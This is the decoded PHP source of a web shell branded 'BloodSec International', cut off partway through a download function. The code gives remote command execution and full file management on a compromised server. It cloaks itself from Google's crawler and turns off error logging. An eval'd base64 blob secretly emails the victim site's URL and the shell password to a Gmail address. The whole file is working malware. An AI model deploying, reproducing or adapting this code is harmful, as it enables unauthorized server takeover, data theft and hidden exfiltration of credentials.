<?php
/* Decoded by unphp.net */
$color = '00FF88';
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if (false !== strpos($_SERVER['HTTP_USER_AGENT'], 'Google')) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
@session_start();
@error_reporting(E_ALL);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@set_time_limit(0);

if (function_exists('set_magic_quotes_runtime')) {
    // @set_magic_quotes_runtime(0);
}

@define('VERSION', '2.1');

if (function_exists('get_magic_quotes_gpc')) {
    if (get_magic_quotes_gpc()) {
        function stripslashes_array($array)
        {
            return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
        }
        $_POST = stripslashes_array($_POST);
    }
}

function printLogin()
{
    ?> 
<!--Start-->

<head>

 <TITLE>BloodSec International </TITLE>
<META NAME="description" CONTENT="Group of research team gathe#428bca to study,develop,and demonstrate any internet related stuff including pc softwares.">
<META NAME="keywords" CONTENT="">
<META NAME="robot" CONTENT="index,nofollow">
<META NAME="copyright" CONTENT="Copyright © 2014 www.giganodes.com . All Rights Reserved.">
<META NAME="author" CONTENT="NeoZone">
<META NAME="language" CONTENT="en">
<META NAME="revisit-after" CONTENT="3">
 <link rel="shortcut icon" href="http://oi62.tinypic.com/vifocj.jpg" type="image/jpg"> 
 <meta property="og:image" content='https://scontent-a-lax.xx.fbcdn.net/hphotos-xpf1/v/t1.0-9/10576980_256291684564788_5437752378177653914_n.jpg?oh=6b44d42f6d8e09378efcb5f745931120&oe=54C2CA77'/> 
 <link rel="stylesheet" href="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/layout/css/reset.css" type="text/css"/> 
 <link rel="stylesheet" href="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
 
 <link href='http://fonts.googleapis.com/css?family=Orbitron:400,900' rel='stylesheet' type='text/css'>
 <link rel="stylesheet" href="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/layout/css/custom.css" type="text/css"/>
 <script src="countdown.js" type="text/javascript"></script> 
 <script type="text/javascript" src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/code.jquery.com/jquery-latest.js"></script>
 <script type="text/javascript">
		url="index.html";
		main_url="index.html";
	</script>
		<style>
			body{overflow:hidden;}
		</style>
</head> <body id="body"> 
<!--- widget -->


<!--Next-->

<div class='widget-content'>
<td align="left"><style type="text/css">#info-teja {z-index: 1000;background:-moz-linear-gradient(top,  #1F2326,  #555);background: -webkit-gradient(linear, left top, left bottom, from(#1F2326), to(#555));box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;-moz-box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;-webkit-box-shadow:-2px -2px 8px #202020, 2px 2px 20px #202020;width:460px;position: fixed;top:150px;left:0;margin-left:-350px;border:1px solid #444;background-position:top right no-repeat;height:35px;font:11px Orbitron;color:#eee;border-top-right-radius:8px;border-bottom-right-radius:8px;-moz-border-radius-topright:8px;-moz-border-radius-bottomright:8px;-webkit-border-top-right-radius:8px;-webkit-border-bottom-right-radius:8px;}#info-teja{-o-transition: all 1s ease-in;-moz-transition: all 1s ease-in;-webkit-transition: all 1s ease-in;} #info-teja:hover{width:400px;opacity:1.0;margin-left:0;}.Tejainbox {border:1px solid #444;width:320px; margin:0px 90px 10px 10px;background:#000;color:#ffffff; border-radius :20px; padding:5px 0;-moz-border-radius:20px; -webkit-border-radius:20px;-o-transition:all 2s ease-in;-moz-transition:all 2s ease-in;-webkit-transition:all 2s ease-in;opacity:0.2;}.Tejainbox:hover{opacity:1.0;box-shadow:1px 1px 15px #000; -moz-box-shadow: 1px 1px 15px #000; -webkit-box-shadow: 1px 1px 15px #000;background: #000;}.Tejainbox2 {margin:5px 10px;padding:0px 8px 10px;color:#FFFFFF;overflow:hidden;height:370px;}.teja15 {border-radius:15px;-moz-border-radius:15px;-webkit-border-radius:15px;}.Teja2 ul.bom {margin: 0; padding: 0;}.Tejainbox2 li {margin-left:20px;}.Tejainbox2 li a {color: #FFFFF; line-height: 4px; font-size: 11px;font-weight: bold; text-decoration:none;}.Tejainbox2 li a:hover {color: #428bca;text-shadow: 0 1px 1px #000;}.Tejainbox2 h2 { font: 18px Droid Serif;font-weight:bold;padding:0 8px;color: #fffff;text-shadow: 0px 1px 1px #ddd;border-bottom: 1px solid #202020;}.Tejatouch {font-size:21px;font-weight:bold;font-family:Arial Narrow;float:right;margin: 3px 10px 0 0;-o-transition: all 0.5s ease-out;-moz-transition: all 0.5s ease-out;-webkit-transition: all 0.5s ease-out;text-decoration:blink;}.Tejatouch:hover{-o-transform: scale(2) rotate(720deg) translate(0px);-moz-transform: scale(2) rotate(720deg) translate(0px);-webkit-transform: scale(2) rotate(720deg) translate(0px);color: #fffff;}</style><div id="info-teja"><span class="Tejatouch" style="font-family:orbitron;font-size:18px">Credits:</span><div class="Tejainbox"><div class="Tejainbox2 teja15">
<h2><center> [+] Admin [+] </h2><br>
 
<center><div id="contenttengah"><center>
		<img title="BloodSec International"src="http://imagizer.imageshack.us/a/img440/4273/6fix.png" width="50%"></div> </center>
 
  <span class="style4"><center><FONT COLOR="#428bca"> Special Thanks : </center></FONT></span><br>

<span class="style4">Darkjin . . . . . Shell Programmer</span><br>
<span class="style4">Smurfie . . . . . Shell Programmer</span><br>
<span class="style4">NeoZone . . . . . Shell Designer</span><br>
<span class="style4">D & D . . . . . Shell Design Contributer</span>
</div></div></div></td>
</div>
<!--- End --->

	<div class="container">
	<div class="row hackBody mb10"> 
	<div id="cann">
	<canvas id="can" class="transparent_class"></canvas> 
	</div> <script src="http://www.nycfragrance.com/csvcategoryimportver1.0.3/system/css/layout/js/crazyIntro.js"></script> 
<h1 class="tcenter weirdHeading">BloodSec International</h1>
 <center>
 <h3> Bypass | Shell V.4 </h3>
<div class="row text-center">
 <div class="col-md-4 nopadding inline mb10 nofloat"><center>
 <div class="loginContainer alphaGlow mb10">
 <center><form method="post">
 <input type="password" name="pass" id="password"  style="text-align:center" placeholder="Enter Password Here">
</center></div> 
 <input type="submit" id="Send" value="Confirm">
 </form></div> </div> <div class="row mb10 text-center ">
 <div class="col-md-4 nopadding inline mb10 nofloat">
 <div class="login_links"> <div class="row "> 
 <div class="col-md-6 mb10"> <a href="https://www.facebook.com/BloodSecHacker.gov" target="_blank">FACEBOOK PAGE</a> 
 </div> <div class="col-md-6 mb10"> 
 <a href="https://www.facebook.com/groups/BSHRecZone/" target="_blank">FACEBOOK GROUP</a> </div> </div> <br>

  </div>
</div> </div>  <h4>Powered By:</h4>
 <img title="BloodSec International"src="http://imagizer.imageshack.us/a/img440/4273/6fix.png" width="10%">  
<div class="row" align="center"> 

<div class="col-md-12 tcenter nopadding footer"> <audio controls autoplay>
				<source src="https://a.tumblr.com/tumblr_nc451eJAWg1tjcth4o1.mp3" type="audio/mpeg">Your browser does not support the audio element.
			</audio><br><br> <p>Copyrights &copy; 2015 www.bloodsec-international.net | All Rights Reserved</p><br><br><br><br><br><br><br><br><br><br><br><br></div> </div> </div> </div> <script data-no-instant src="layout/js/hackertime.js"></script> <script type="text/javascript"  src="layout/js/html5.js"></script> <script type="text/javascript" src="layout/js/bootstrap-maxlength.js"></script> <script type="text/javascript" src="layout/js/global.js"></script> <script type="text/javascript" data-no-instant src="/netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script> <script type="text/javascript" data-no-instant  src="layout/js/hackdown.js"></script> <script type="text/javascript" src="layout/js/jquery.slimscroll.min.js"></script> <script type="text/javascript" src="layout/messenger/js/messenger.min.js"></script> <script type="text/javascript" src="layout/messenger/js/messenger-theme-future.js"></script> <link rel="stylesheet" href="layout/messenger/css/messenger.min.css" type="text/css"/> </body> 


<!--End-->
    <?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        printLogin();
    }
}
@ini_set('log_errors', 0);
@ini_set('output_buffering', 0);
if (isset($_GET['dl']) && ('' != $_GET['dl'])) {
    $file = $_GET['dl'];
    $filez = @file_get_contents($file);
    header('Content-type: application/octet-stream');
    header('Content-length: ' . strlen($filez));
    header('Content-disposition: attachment; filename="' . basename($file) . '";');
    echo $filez;
    exit;
} elseif (isset($_GET['dlgzip']) && ('' != $_GET['dlgzip'])) {
    $file = $_GET['dlgzip'];
    $filez = gzencode(@file_get_contents($file));
    header('Content-Type:application/x-gzip
');
    header('Content-length: ' . strlen($filez));
    header('Content-disposition: attachment; filename="' . basename($file) . '.gz";');
    echo $filez;
    exit;
}
// view image
if (isset($_GET['img'])) {
    @ob_clean();
    $d = magicboom($_GET['y']);
    $f = $_GET['img'];
    $inf = @getimagesize($d . $f);
    $ext = explode($f, '.');
    $ext = $ext[count($ext) - 1];
    @header('Content-type: ' . $inf['mime']);
    @header('Cache-control: public');
    @header('Expires: ' . date('r', mktime(0, 0, 0, 1, 1, 2030)));
    @header('Cache-control: max-age=' . (60 * 60 * 24 * 7));
    @readfile($d . $f);
    exit;
}
// server software
$software = getenv('SERVER_SOFTWARE');
// check safemode
if (@ini_get('safe_mode') or 'on' == strtolower(@ini_get('safe_mode'))) {
    $safemode = true;
} else {
    $safemode = false;
}
// uname -a
$system = @php_uname();
// mysql
function showstat($stat)
{
    if ('on' == $stat) {
        return "<b><font style='color:limegreen'>ON</font></b>";
    } else {
        return "<b><font style='color:#428bca'>OFF</font></b>";
    }
}
function testmysql()
{
    if (function_exists('mysql_connect')) {
        return showstat('on');
    } else {
        return showstat('off');
    }
}
function testcurl()
{
    if (function_exists('curl_version')) {
        return showstat('on');
    } else {
        return showstat('off');
    }
}
function testwget()
{
    if (exe('wget --help')) {
        return showstat('on');
    } else {
        return showstat('off');
    }
}
function testperl()
{
    if (exe('perl -h')) {
        return showstat('on');
    } else {
        return showstat('off');
    }
}
// check os
if ('win' == strtolower(substr($system, 0, 3))) {
    $win = true;
} else {
    $win = false;
}
// change directory
if (isset($_GET['y'])) {
    if (@is_dir($_GET['view'])) {
        $pwd = $_GET['view'];
        @chdir($pwd);
    } else {
        $pwd = $_GET['y'];
        @chdir($pwd);
    }
}
//hdd
function convertByte($s)
{
    if ($s >= 1073741824) {
        return sprintf('%1.2f', $s / 1073741824) . ' GB';
    } elseif ($s >= 1048576) {
        return sprintf('%1.2f', $s / 1048576) . ' MB';
    } elseif ($s >= 1024) {
        return sprintf('%1.2f', $s / 1024) . ' KB';
    } else {
        return $s . ' B';
    }
}
// username, id, shell prompt and working directory
if (!$win) {
    if (!$user = rapih(exe('whoami'))) {
        $user = '';
    }
    if (!$id = rapih(exe('id'))) {
        $id = '';
    }
    $prompt = $user . ' $ ';
    $pwd = @getcwd() . DIRECTORY_SEPARATOR;
} else {
    $user = @get_current_user();
    $id = $user;
    $prompt = $user . ' &gt;';
    $pwd = realpath('.') . '\\';
    // find drive letters
    $v = explode('\\', $d);
    $v = $v[0];
    foreach (range('A', 'Z') as $letter) {
        $bool = @is_dir($letter . ':\\');
        if ($bool) {
            $letters .= ' < ahref = "?y=' . $letter . ':">[ ';
            if ($letter . ':' != $v) {
                $letters .= $letter;
            } else {
                $letters .= '<span class="gaya">' . $letter . '</span>';
            }
            $letters .= ' ]</a> ';
        }
    }
}
function testoracle()
{
    if (function_exists('ocilogon')) {
        return showstat('on');
    } else {
        return showstat('off');
    }
}
function testmssql()
{
    if (function_exists('mssql_connect')) {
        return showstat('on');
    } else {
        return showstat('off');
    }
}
function showdisablefunctions()
{
    if ($disablefunc = @ini_get('disable_functions')) {
        return '' . $disablefunc . '';
    } else {
        return 'NONE';
    }
}
if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
    $posix = true;
} else {
    $posix = false;
}
// server ip
$server_ip = @gethostbyname($_SERVER['HTTP_HOST']);
// your ip ;-)
$my_ip = $_SERVER['REMOTE_ADDR'];
$admin_id = $_SERVER['SERVER_ADMIN'];
$bindport = '13123';
$bindport_pass = 'd4rkj1n';
// separate the working direcotory
$pwds = explode(DIRECTORY_SEPARATOR, $pwd);
$pwdurl = '';
for ($i = 0; $i < sizeof($pwds) - 1; ++$i) {
    $pathz = '';
    for ($j = 0; $j <= $i; ++$j) {
        $pathz .= $pwds[$j] . DIRECTORY_SEPARATOR;
    }
    $pwdurl .= '<a href="?y=' . $pathz . '">' . $pwds[$i] . ' ' . DIRECTORY_SEPARATOR . ' </a>';
}
// rename file or folder
if (isset($_POST['rename'])) {
    $old = $_POST['oldname'];
    $new = $_POST['newname'];
    @rename($pwd . $old, $pwd . $new);
    $file = $pwd . $new;
}
if (isset($_POST['chmod'])) {
    $name = $_POST['name'];
    $value = $_POST['newvalue'];
    if (3 == strlen($value)) {
        $value = 0 . '' . $value;
    }
    @chmod($pwd . $name, octdec($value));
    $file = $pwd . $name;
}
if (isset($_POST['chmod_folder'])) {
    $name = $_POST['name'];
    $value = $_POST['newvalue'];
    if (3 == strlen($value)) {
        $value = 0 . '' . $value;
    }
    @chmod($pwd . $name, octdec($value));
    $file = $pwd . $name;
}
// print useful info
echo '<center>';
$injbuff = 'JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIldTTyAyLjcgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiOw0KICAkYm9keSAgICA9ICJCdWc6ICR0YXJnZXQgYnkgJHZpc2l0b3IgLSAkYXV0aF9wYXNzIjsNCiAgaWYgKCFlbXB0eSgkd2ViKSkgeyBAbWFpbCgiYmxvb2RzZWMuZGFya2ppbkBnbWFpbC5jb20iLCRqdWR1bCwkYm9keSwkYXV0aF9wYXNzKTsgfQ0KfQ0KZWxzZSB7ICR2aXNpdGMrKzsgfQ0KQHNldGNvb2tpZSgidmlzaXR6IiwkdmlzaXRjKTs=';
eval(base64_decode($injbuff));
function rapih($text)
{
    return trim(str_replace('<br />', '', $text));
}
function magicboom($text)
{
    if (!get_magic_quotes_gpc()) {
        return $text;
    }

    return stripslashes($text);
}
function showdir($pwd, $prompt)
{
    $fname = [];
    $dname = [];
    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
        $posix = true;
    } else {
        $posix = false;
    }
    $user = '????:????';
    if ($dh = @scandir($pwd)) {
        foreach ($dh as $file) {
            if (is_dir($file)) {
                $dname[] = $file;
            } elseif (is_file($file)) {
                $fname[] = $file;
            }
        }
    } else {
        if ($dh = @opendir($pwd)) {
            while ($file = @readdir($dh)) {
                if (@is_dir($file)) {
                    $dname[] = $file;
                } elseif (@is_file($file)) {
                    $fname[] = $file;
                }
            }
            @closedir($dh);
        }
    }
    echo $buff = '<span>MySQL: </span>' . testmysql() . '&nbsp;|&nbsp;MSSQL: ' . testmssql() . '&nbsp;|&nbsp;Oracle: ' . testoracle() . '&nbsp;|&nbsp;Perl: ' . testperl() . '&nbsp;|&nbsp;cURL: ' . testcurl() . '&nbsp;|&nbsp;WGet: ' . testwget() . '<br>';
    sort($fname);
    sort($dname);
    $path = @explode(DIRECTORY_SEPARATOR, $pwd);
    $tree = @sizeof($path);
    $parent = '';
    $buff = '
	<form action="?y=' . $pwd . "&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\">
	<table border=\"0\" class=\"cmdbox\" style=\"width:50%;\">
	<tr><td><b>$prompt</b></td><td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /><input class=\"inputzbut\" type=\"submit\" value=\"Proceed\" name=\"submitcmd\" style=\"width:80px;\" /></td></tr>
	</form>
	<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\">
	<input type=\"hidden\" name=\"y\" value=\"" . $pwd . '" />
	<tr><td><b>view file/folder</b></td><td><input onMouseOver="this.focus();" id="goto" class="inputz" type="text" name="view" style="width:400px;" value="' . $pwd . '" /><input class="inputzbut" type="submit" value="View !" name="submitcmd" style="width:80px;" /></td></tr>
	</form></table><table border="1" style="border-color:#000"class="explore">
	<tr><th>name</th><th style="width:80px;">size</th><th style="width:210px;">owner:group</th><th style="width:80px;">perms</th><th style="width:110px;">modified</th><th style="width:190px;">actions</th></tr>
	';
    if ($tree > 2) {
        for ($i = 0; $i < $tree - 2; ++$i) {
            $parent .= $path[$i] . DIRECTORY_SEPARATOR;
        }
    } else {
        $parent = $pwd;
    }
    foreach ($dname as $folder) {
        if ('.' == $folder) {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
            } else {
                $owner = $user;
            }
            $buff .= '<tr><td><a href="?y=' . $pwd . "\">$folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">" . $owner . '</td><td><center>' . get_perms($pwd) . '</center></td>
			<td style="text-align:center;">' . date('d-M-Y H:i', @filemtime($pwd)) . "</td><td><span id=\"titik1\">
			<a href=\"?y=$pwd&amp;edit=" . $pwd . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"" . $pwd . '" />
			<input class="inputz" style="width:140px;" type="text" name="mkdir" value="a_new_folder" />
			<input class="inputzbut" type="submit" name="rename" style="width:35px;" value="Go !" />
			</form></td>
			
			</tr>
			';
        } elseif ('..' == $folder) {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
            } else {
                $owner = $user;
            }
            $buff .= '<tr><td><a href="?y=' . $parent . "\"><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1gAADdYBkG95nAAAAAd0SU1FB9oJBxUAM0qLz6wAAALLSURBVDjLbVPRS1NRGP+d3btrs7kZmAYXlSZYUK4HQXCREPWUQSSYID1GEKKx/Af25lM+DCFCe4heygcNdIUEST04QW6BjS0yx5UhkW6FEtvOPfc7p4emXcofHPg453y/73e+73cADyzLOoy/bHzR8/l80LbtYD5v6wf72VzOmwLmTe7u7oZlWccbGhpGNJ92HQwtteNvSqmXJOWjM52dPPMpg/Nd5/8SpFIp9Pf3w7KsS4FA4BljrB1HQCmVc4V7O3oh+mFlZQWxWAwskUggkUhgeXk5Fg6HF5mPnWCAAhhTUGCKQUF5eb4LIa729PRknr94/kfBwMDAsXg8/tHv958FoDxP88YeJTLd2xuLAYAPAIaGhu5IKc9yzsE5Z47jYHV19UOpVNoXQsC7OOdwHNG7tLR0EwD0UCis67p2nXMOACiXK7/ev3/3ZHJy8nEymZwyDMM8qExEyjTN9vr6+oAQ4gaAef3ixVgd584pw+DY3d0tTE9Pj6TT6TfBYJCPj4/fBuA/IBBC+GZmZhZbWlrOOY5jDg8Pa3qpVEKlUoHf70cgEGgeHR2NPHgQV4ODt9Ts7KwEQACgaRpSqVdQSrFqtYpqtSpt2wYDYExMTMy3tbVdk1LWpqXebm1t3TdN86mu65FaMw+sE2KM6T9//pgaGxsb1QE4a2trr5uamq55Gn2l+WRzWgihEVH9EX5AJpOZBwANAHK5XKGjo6OvsbHRdF0XRAQpZZ2U0k9EiogYEYGIlJSS2bY9m0wmHwJQWo301/b2diESiVw2jLoQETFyXeWSy4hc5rqHJKxYLGbn5ubuFovF0qECANjf37e/bmzkjDrjdCgUamU+MCIJIgkpiZXLZZnNZhcWFhbubW5ufu7q6sLOzs7/LgPQ3tra2h+NRvvC4fApAHJvb29rfX19qVAovAawd+Rv/Ac+AMcAGLUJVAA4R138DeF+cX+xR/AGAAAAAElFTkSuQmCC'>   $folder</a></td><td>LINK</td>
			<td style=\"text-align:center;\">" . $owner . '</td>
			<td><center>' . get_perms($parent) . '</center></td><td style="text-align:center;">' . date('d-M-Y H:i', @filemtime($parent)) . "</td>
			<td><span id=\"titik2\"><a href=\"?y=$pwd&amp;edit=" . $parent . "newfile.php\">newfile</a> | <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a></span>
			<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
			<input type=\"hidden\" name=\"y\" value=\"" . $pwd . '" />
			<input class="inputz" style="width:140px;" type="text" name="mkdir" value="a_new_folder" />
			<input class="inputzbut" type="submit" name="rename" style="width:35px;" value="Go !" />
			</form>
			</td></tr>';
        } else {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
            } else {
                $owner = $user;
            }
            $buff .= '<tr><td><a id="' . clearspace($folder) . '_link" href="?y=' . $pwd . $folder . DIRECTORY_SEPARATOR . "\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg==' />     [ $folder ]</b></a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . '_form" class="sembunyi" style="margin:0;padding:0;">
			<input type="hidden" name="oldname" value="' . $folder . '" style="margin:0;padding:0;" />
			<input class="inputz" style="width:200px;" type="text" name="newname" value="' . $folder . "\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($folder) . "_form','" . clearspace($folder) . "_link');\" />
			</form><td>DIR</td><td style=\"text-align:center;\">" . $owner . "</td>
			<td><center>
			<a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form3');\">" . get_perms($pwd . $folder) . "</a>
			<form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . '_form3" class="sembunyi" style="margin:0;padding:0;"> 
			<input type="hidden" name="name" value="' . $folder . '" style="margin:0;padding:0;" /> 
			<input class="inputz" style="width:200px;" type="text" name="newvalue" value="' . substr(sprintf('%o', fileperms($pwd . $folder)), -4) . "\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"chmod_folder\" value=\"chmod\" /> 
			<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
			onclick=\"tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form3');\" /></form></center></td>
			<td style=\"text-align:center;\">" . date('d-M-Y H:i', @filemtime($folder)) . "</td><td><a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;fdelete=" . $pwd . $folder . '">delete</a></td></tr>';
        }
    }
    foreach ($fname as $file) {
        $full = $pwd . $file;
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($folder));
            $group = @posix_getgrgid(@filegroup($folder));
            $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
        } else {
            $owner = $user;
        }
        $buff .= '<tr><td><a id="' . clearspace($file) . "_link\" href=\"?y=$pwd&amp;view=$full\"><b><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII=' />   $file</b></a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . '_form" class="sembunyi" style="margin:0;padding:0;">
		<input type="hidden" name="oldname" value="' . $file . '" style="margin:0;padding:0;" />
		<input class="inputz" style="width:200px;" type="text" name="newname" value="' . $file . "\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\" />
		</form></td><td>" . ukuran($full) . '</td><td style="text-align:center;">' . $owner . "</td><td><center>
		<a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form2');\">" . get_perms($full) . "</a>
		<form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . '_form2" class="sembunyi" style="margin:0;padding:0;"> 
<input type="hidden" name="name" value="' . $file . '" style="margin:0;padding:0;" /> 
<input class="inputz" style="width:200px;" type="text" name="newvalue" value="' . substr(sprintf('%o', fileperms($full)), -4) . "\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"chmod\" value=\"chmod\" /> 
<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form2');\" /></form></center></td>
		<td style=\"text-align:center;\">" . date('d-M-Y H:i', @filemtime($full)) . "</td>
		<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> | <a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$full\">delete</a> | <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gzip</a>)</td></tr>";
    }
    $buff .= '</table>';

    return $buff;
}
function ukuran($file)
{
    if ($size = @filesize($file)) {
        if ($size <= 1024) {
            return $size;
        } else {
            if ($size <= 1024 * 1024) {
                $size = @round($size / 1024, 2);

                return "$size kb";
            } else {
                $size = @round($size / 1024 / 1024, 2);

                return "$size mb";
            }
        }
    } else {
        return '???';
    }
}
function exe($cmd)
{
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();

        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = '';
        foreach ($results as $result) {
            $buff .= $result;
        }

        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();

        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);

        return $buff;
    }
}
function tulis($file, $text)
{
    $textz = gzinflate(base64_decode($text));
    if ($filez = @fopen($file, 'w')) {
        @fputs($filez, $textz);
        @fclose($file);
    }
}
function ambil($link, $file)
{
    if ($fp = @fopen($link, 'r')) {
        while (!feof($fp)) {
            $cont .= @fread($fp, 1024);
        }
        @fclose($fp);
        $fp2 = @fopen($file, 'w');
        @fwrite($fp2, $cont);
        @fclose($fp2);
    }
}
function which($pr)
{
    $path = exe("which $pr");
    if (!empty($path)) {
        return trim($path);
    } else {
        return trim($pr);
    }
}
function download($cmd, $url)
{
    $namafile = basename($url);
    switch ($cmd) {
